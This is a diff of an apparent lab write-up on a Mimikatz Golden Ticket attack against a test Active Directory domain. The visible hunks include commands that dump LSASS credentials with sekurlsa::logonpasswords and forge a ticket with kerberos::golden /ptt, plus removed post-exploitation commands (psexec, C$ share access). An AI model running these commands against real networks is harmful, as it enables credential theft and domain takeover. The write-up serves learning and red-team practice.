@@ -95,6 +95,14 @@ Privilege '20' OK
 
 `Privilege '20' OK` means Mimikatz successfully got **SeDebugPrivilege** — this allows it to access memory of other processes including LSASS which holds all the credentials.
 
+LSASS stands for Local Security Authority Subsystem Service.
+When log into Windows, LSASS:
+
+- Verifies username and password
+- Checks credentials against local accounts or Active Directory
+- Creates access token (identity + permissions in the system)
+- Enforces security policies (like password rules, login restrictions)
+
 ## Step 3 — Dumping Credentials from Memory
 
 Now I need Domain SID and krbtgt NTLM Hash.
@@ -104,8 +112,7 @@ sekurlsa::logonpasswords
 ```
 
 This command tells Mimikatz to dig into LSASS process memory and pull out all the credentials Windows is storing there.
-
-LSASS (Local Security Authority Subsystem Service) is a Windows process that handles all logins. Every time someone logs into the machine, Windows keeps their credentials in LSASS memory to keep the session running. Mimikatz reaches into that memory and pulls everything out.
+Mimikatz reaches into that memory and pulls everything out.
 
 **Output:**
 
@@ -177,13 +184,6 @@ kerberos::golden /user:Administrator /domain:readteambd.local /sid:S-1-5-21-2745
 | `/id` | `500` | RID of Administrator account — 500 is always the built-in Administrator |
 | `/ptt` | — | Pass the Ticket — injects the forged ticket directly into memory instead of saving to a file |
 
-### `/ptt` vs `/ticket`
-
-| Flag | What it does |
-|------|-------------|
-| `/ptt` | Injects ticket directly into current session memory |
-| `/ticket` | Saves the ticket to a `.kirbi` file for later use |
-
 I used `/ptt` here so the ticket gets loaded into my session immediately — no need to load it manually afterwards.
 
 **Output:**
@@ -218,19 +218,6 @@ mimikatz # misc::cmd
 ```
 
 After injecting the Golden Ticket with `/ptt`, I ran `misc::cmd` to open a new CMD shell that carries the forged ticket in its session. Any command I run inside that shell will use the Golden Ticket for authentication — meaning I have full Domain Admin access across the entire domain.
-
-### What I Can Do Inside That Shell
-
-```cmd
-# Access the Domain Controller file system
-dir \\READTEAMBD-DC\C$
-
-# Get a shell on any machine in the domain
-psexec \\READTEAMBD-DC cmd.exe
-
-# List all domain machines
-net view /domain
-```
 
 ## Step 7 — Accessing Victim Machine File System
 
